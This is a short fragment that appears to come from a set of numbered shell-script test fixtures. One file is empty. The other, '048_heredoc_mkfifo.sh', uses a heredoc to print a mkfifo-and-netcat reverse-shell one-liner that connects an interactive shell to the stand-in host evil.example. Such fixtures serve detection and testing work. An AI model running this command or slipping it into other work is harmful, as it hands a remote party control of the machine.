files.047_heredoc_remote_name.sh:

files.048_heredoc_mkfifo.sh:
cat <<'EOF'
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f
EOF
